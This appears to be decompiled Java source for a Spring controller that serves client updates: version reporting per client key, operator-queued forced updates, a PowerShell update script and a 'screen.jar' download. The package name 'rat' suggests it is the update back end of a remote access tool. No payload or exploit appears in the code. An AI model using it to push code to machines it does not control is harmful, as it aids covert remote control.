package com.example.rat;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.LinkedHashMap;
import java.util.Map;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.core.io.ClassPathResource;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.http.ResponseEntity.BodyBuilder;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestBody;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@RestController
@RequestMapping("/api/client")
public class ClientUpdateController {
   private static final ObjectMapper JSON = new ObjectMapper();
   @Value("${app.client.version:1.1.6}")
   private String currentVersion;
   @Value("${app.client.jar.path:/root/server2/build/screen.jar}")
   private String clientJarPath;

   private static Path dir() {
      return Paths.get("data", "client");
   }

   private static String safeKey(String key) {
      if (key != null && !key.trim().isEmpty()) {
         String k = key.trim().replaceAll("[^a-zA-Z0-9._-]", "_");
         return k.length() > 128 ? k.substring(0, 128) : k;
      } else {
         return "unknown";
      }
   }

   private static Path versionFile(String key) {
      return dir().resolve(safeKey(key) + ".version");
   }

   private static Path updateFile(String key) {
      return dir().resolve(safeKey(key) + ".update");
   }

   @PostMapping("/version")
   public ResponseEntity<String> reportVersion(@RequestParam("key") String key, @RequestBody(required = false) String body) throws IOException {
      String version = "";
      if (body != null) {
         try {
            JsonNode n = JSON.readTree(body);
            if (n != null && n.has("version")) {
               version = n.get("version").asText("");
            }
         } catch (Exception var5) {
         }
      }

      Files.createDirectories(dir());
      Files.write(versionFile(key), version.getBytes(StandardCharsets.UTF_8));
      return ResponseEntity.ok("{\"ok\":true}");
   }

   @GetMapping("/version")
   public Map<String, Object> getVersion(@RequestParam("key") String key) throws IOException {
      Map<String, Object> r = new LinkedHashMap<>();
      r.put("current", this.currentVersion);
      String reported = null;
      Path f = versionFile(key);
      if (Files.isRegularFile(f)) {
         reported = new String(Files.readAllBytes(f), StandardCharsets.UTF_8).trim();
      }

      r.put("version", reported == null ? "" : reported);
      boolean outdated = reported == null || reported.isEmpty() || compare(reported, this.currentVersion) < 0;
      r.put("outdated", outdated);
      return r;
   }

   @PostMapping("/update")
   public ResponseEntity<String> requestUpdate(@RequestParam("key") String key) throws IOException {
      Files.createDirectories(dir());
      Files.write(updateFile(key), "1".getBytes(StandardCharsets.UTF_8));
      return ResponseEntity.ok("{\"ok\":true,\"queued\":true}");
   }

   @GetMapping("/update")
   public Map<String, Object> pollUpdate(@RequestParam("key") String key) throws IOException {
      Map<String, Object> r = new LinkedHashMap<>();
      Path f = updateFile(key);
      boolean forced = Files.isRegularFile(f);
      if (forced) {
         Files.deleteIfExists(f);
      }

      String reported = null;
      Path vf = versionFile(key);
      if (Files.isRegularFile(vf)) {
         reported = new String(Files.readAllBytes(vf), StandardCharsets.UTF_8).trim();
      }

      boolean outdated = reported == null || reported.isEmpty() || compare(reported, this.currentVersion) < 0;
      if (!forced && !outdated) {
         r.put("update", false);
      } else {
         r.put("update", true);
         r.put("url", "/api/client/jar");
         r.put("version", this.currentVersion);
      }

      return r;
   }

   @GetMapping(value = "/update.ps1", produces = "text/plain;charset=UTF-8")
   public ResponseEntity<String> updateScript() throws IOException {
      ClassPathResource res = new ClassPathResource("static/client-update.ps1");
      InputStream in = res.getInputStream();

      byte[] data;
      try {
         ByteArrayOutputStream b = new ByteArrayOutputStream();
         byte[] buf = new byte[8192];

         int n;
         while ((n = in.read(buf)) != -1) {
            b.write(buf, 0, n);
         }

         data = b.toByteArray();
      } catch (Throwable var8) {
         if (in != null) {
            try {
               in.close();
            } catch (Throwable var7) {
               var8.addSuppressed(var7);
            }
         }

         throw var8;
      }

      if (in != null) {
         in.close();
      }

      return ResponseEntity.ok().contentType(MediaType.parseMediaType("text/plain;charset=UTF-8")).body(new String(data, StandardCharsets.UTF_8));
   }

   @GetMapping("/jar")
   public ResponseEntity<byte[]> jar() throws IOException {
      Path p = Paths.get(this.clientJarPath);
      if (!Files.isRegularFile(p)) {
         return ResponseEntity.notFound().build();
      }

      byte[] data = Files.readAllBytes(p);
      return ((BodyBuilder)ResponseEntity.ok()
            .contentType(MediaType.parseMediaType("application/java-archive"))
            .header("Content-Disposition", new String[]{"attachment; filename=\"client.jar\""}))
         .body(data);
   }

   private static int compare(String a, String b) {
      String[] pa = a.split("\\.");
      String[] pb = b.split("\\.");

      for (int i = 0; i < Math.max(pa.length, pb.length); i++) {
         int va = i < pa.length ? parseInt(pa[i]) : 0;
         int vb = i < pb.length ? parseInt(pb[i]) : 0;
         if (va != vb) {
            return va - vb;
         }
      }

      return 0;
   }

   private static int parseInt(String s) {
      try {
         return Integer.parseInt(s.trim());
      } catch (Exception e) {
         return 0;
      }
   }
}
